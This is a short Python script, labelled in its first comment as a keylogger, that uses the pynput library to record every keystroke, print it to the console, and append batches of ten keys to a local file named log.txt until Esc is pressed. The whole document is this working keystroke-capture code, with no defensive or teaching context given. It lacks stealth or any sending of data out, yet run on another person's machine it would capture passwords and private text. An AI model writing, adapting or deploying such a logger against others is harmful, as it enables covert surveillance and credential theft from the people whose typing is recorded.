#Keylogger modules import
import pynput
from pynput.keyboard import Key, Listener
import logging

count = 0
keys = []

def on_press(key):
    global keys, count
    count += 1
    keys.append(key)#append the key to the keys list
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a", encoding="utf-8") as f: 
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def  on_release(key):
    if key == Key.esc:
        print("Exiting...")
        return False




with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
